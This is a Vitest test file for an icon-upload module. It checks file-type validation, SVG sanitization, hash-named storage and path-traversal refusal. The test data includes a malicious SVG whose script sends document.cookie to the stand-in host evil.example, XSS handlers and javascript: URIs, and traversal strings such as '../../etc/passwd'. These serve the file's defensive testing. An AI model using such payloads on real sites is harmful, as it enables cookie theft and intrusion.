// @vitest-environment node
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

let uploadsDir: string;

beforeEach(() => {
  uploadsDir = mkdtempSync(path.join(tmpdir(), "kokpit-icons-"));
  process.env.KOKPIT_UPLOADS_PATH = uploadsDir;
});

afterEach(() => {
  rmSync(uploadsDir, { recursive: true, force: true });
  delete process.env.KOKPIT_UPLOADS_PATH;
});

const PNG_MAGIC = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0]);

async function fresh() {
  return import("@/lib/iconUploads");
}

describe("processIconUpload — validation", () => {
  it("rejects an empty file", async () => {
    const { processIconUpload, IconUploadError } = await fresh();
    expect(() =>
      processIconUpload({ bytes: new Uint8Array(0), declaredType: "image/png", filename: "a.png" })
    ).toThrow(IconUploadError);
  });

  it("rejects a file over the 2 MB limit", async () => {
    const { processIconUpload } = await fresh();
    const big = new Uint8Array(2 * 1024 * 1024 + 1);
    big.set(PNG_MAGIC);
    try {
      processIconUpload({ bytes: big, declaredType: "image/png", filename: "a.png" });
      throw new Error("should have thrown");
    } catch (err) {
      expect((err as { status: number }).status).toBe(413);
    }
  });

  it("rejects a disallowed type (e.g. gif)", async () => {
    const { processIconUpload } = await fresh();
    try {
      processIconUpload({
        bytes: new Uint8Array([0x47, 0x49, 0x46, 0x38]),
        declaredType: "image/gif",
        filename: "a.gif",
      });
      throw new Error("should have thrown");
    } catch (err) {
      expect((err as { status: number }).status).toBe(415);
    }
  });

  it("rejects a file whose bytes don't match the claimed raster type", async () => {
    const { processIconUpload } = await fresh();
    // Declared png, but the bytes are HTML — magic-byte sniffing must reject it.
    const html = new TextEncoder().encode("<html><script>alert(1)</script></html>");
    expect(() =>
      processIconUpload({ bytes: html, declaredType: "image/png", filename: "evil.png" })
    ).toThrow();
  });

  it("accepts a real PNG by magic bytes", async () => {
    const { processIconUpload } = await fresh();
    const result = processIconUpload({
      bytes: PNG_MAGIC,
      declaredType: "image/png",
      filename: "logo.png",
    });
    expect(result.ext).toBe("png");
  });

  it("derives the extension from the filename when the MIME type is generic", async () => {
    const { processIconUpload } = await fresh();
    const result = processIconUpload({
      bytes: PNG_MAGIC,
      declaredType: "application/octet-stream",
      filename: "logo.PNG",
    });
    expect(result.ext).toBe("png");
  });
});

describe("processIconUpload — SVG sanitization", () => {
  it("strips <script>, event handlers, and javascript: URIs from an SVG", async () => {
    const { processIconUpload } = await fresh();
    const malicious = `<?xml version="1.0"?>
      <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
        <script>fetch('https://evil.example/'+document.cookie)</script>
        <a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a>
        <rect width="20" height="20" fill="blue"/>
      </svg>`;
    const result = processIconUpload({
      bytes: new TextEncoder().encode(malicious),
      declaredType: "image/svg+xml",
      filename: "logo.svg",
    });
    const out = result.bytes.toString("utf-8").toLowerCase();
    expect(result.ext).toBe("svg");
    expect(out).not.toContain("<script");
    expect(out).not.toContain("onload");
    expect(out).not.toContain("javascript:");
    // Benign shapes survive so the icon still renders.
    expect(out).toContain("<rect");
  });

  it("rejects content that isn't an SVG at all", async () => {
    const { processIconUpload } = await fresh();
    expect(() =>
      processIconUpload({
        bytes: new TextEncoder().encode("<html><body>hi</body></html>"),
        declaredType: "image/svg+xml",
        filename: "notreally.svg",
      })
    ).toThrow();
  });
});

describe("storeIconUpload / readIconUpload", () => {
  it("round-trips a stored icon with the correct Content-Type", async () => {
    const { processIconUpload, storeIconUpload, readIconUpload } = await fresh();
    const processed = processIconUpload({
      bytes: PNG_MAGIC,
      declaredType: "image/png",
      filename: "logo.png",
    });
    const filename = await storeIconUpload(processed);
    expect(filename).toMatch(/^[a-f0-9]{32}\.png$/);

    const stored = await readIconUpload(filename);
    expect(stored?.contentType).toBe("image/png");
    expect(stored?.bytes.equals(processed.bytes)).toBe(true);
  });

  it("stores identical content under the same hash filename (dedup)", async () => {
    const { processIconUpload, storeIconUpload } = await fresh();
    const a = await storeIconUpload(
      processIconUpload({ bytes: PNG_MAGIC, declaredType: "image/png", filename: "a.png" })
    );
    const b = await storeIconUpload(
      processIconUpload({ bytes: PNG_MAGIC, declaredType: "image/png", filename: "b.png" })
    );
    expect(a).toBe(b);
  });

  it("serves a sanitized SVG with image/svg+xml", async () => {
    const { processIconUpload, storeIconUpload, readIconUpload } = await fresh();
    const processed = processIconUpload({
      bytes: new TextEncoder().encode('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>'),
      declaredType: "image/svg+xml",
      filename: "logo.svg",
    });
    const filename = await storeIconUpload(processed);
    const stored = await readIconUpload(filename);
    expect(stored?.contentType).toBe("image/svg+xml");
    expect(stored?.bytes.toString("utf-8").toLowerCase()).not.toContain("<script");
  });

  it("refuses a path-traversal filename", async () => {
    const { readIconUpload } = await fresh();
    expect(await readIconUpload("../../etc/passwd")).toBeNull();
    expect(await readIconUpload("..%2f..%2fusers.db")).toBeNull();
    expect(await readIconUpload("nothash.png")).toBeNull();
  });

  it("returns null for a well-formed name that doesn't exist", async () => {
    const { readIconUpload } = await fresh();
    expect(await readIconUpload("deadbeefdeadbeefdeadbeefdeadbeef.png")).toBeNull();
  });
});
